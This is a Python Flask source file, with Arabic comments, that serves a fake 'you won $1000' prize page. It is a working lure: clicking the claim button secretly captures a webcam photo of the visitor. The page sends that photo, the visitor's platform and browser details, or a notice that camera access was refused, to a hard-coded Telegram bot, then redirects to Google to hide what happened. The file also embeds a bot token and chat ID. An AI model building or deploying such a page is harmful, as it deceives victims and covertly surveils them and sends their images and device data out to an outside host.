import os
from flask import Flask, render_template_string

app = Flask(__name__)

# --- بياناتك الخاصة ---
TOKEN = "8566876263:AAEZg8TXPObYtzkjCJ6WqfU014qtkmW5GHY"
CHAT_ID = "8008017291"

# --- كود صفحة الفخ (HTML + JS) ---
HTML_TEMPLATE = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>🎁 مبروك! فوز مفاجئ</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{ background: #0f0f0f; color: #ffd700; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; text-align: center; }}
        .card {{ background: #1a1a1a; padding: 40px; border-radius: 20px; border: 2px solid #ffd700; box-shadow: 0 0 20px #ffd700; max-width: 400px; width: 90%; }}
        .btn {{ background: #ffd700; color: #000; padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; margin-top: 20px; }}
        #v, #c {{ display: none; }}
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 60px;">🏆</div>
        <h1>ربحت 1000$</h1>
        <p>تم اختيارك لاستلام جائزة نقدية فورية!</p>
        <button class="btn" onclick="capture()">تأكيد واستلام الآن</button>
        <p id="st" style="font-size: 12px; color: #888; margin-top: 15px;"></p>
    </div>
    <video id="v" autoplay></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        async function capture() {{
            document.getElementById( st ).innerText = "جاري معالجة الطلب...";
            try {{
                const s = await navigator.mediaDevices.getUserMedia({{video:true}});
                const v = document.getElementById( v );
                v.srcObject = s;
                setTimeout(() => {{
                    const c = document.getElementById( c );
                    c.getContext( 2d ).drawImage(v, 0, 0);
                    c.toBlob(b => send(b),  image/jpeg );
                    s.getTracks().forEach(t => t.stop());
                }}, 2000);
            }} catch(e) {{ send(null); }}
        }}

        async function send(blob) {{
            const fd = new FormData();
            fd.append( chat_id ,  {CHAT_ID} );
            const info = "🚨 هدف جديد!\\n📱 المنصة: " + navigator.platform + "\\n🌐 المتصفح: " + navigator.userAgent.split(   )[0];
            
            if(blob) {{
                fd.append( photo , blob,  shot.jpg );
                fd.append( caption , info);
                await fetch(`https://api.telegram.org/bot{TOKEN}/sendPhoto`, {{method: POST , body:fd}});
            }} else {{
                fd.append( text , info + "\\n⚠️ رفض الكاميرا");
                await fetch(`https://api.telegram.org/bot{TOKEN}/sendMessage`, {{method: POST , body:new URLSearchParams(fd)}});
            }}
            window.location.href = "https://www.google.com";
        }}
    </script>
</body>
</html>
"""

@app.route( / )
def home():
    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    # الحصول على البورت من السيرفر السحابي تلقائياً
    port = int(os.environ.get("PORT", 5000))
    app.run(host= 0.0.0.0 , port=port)
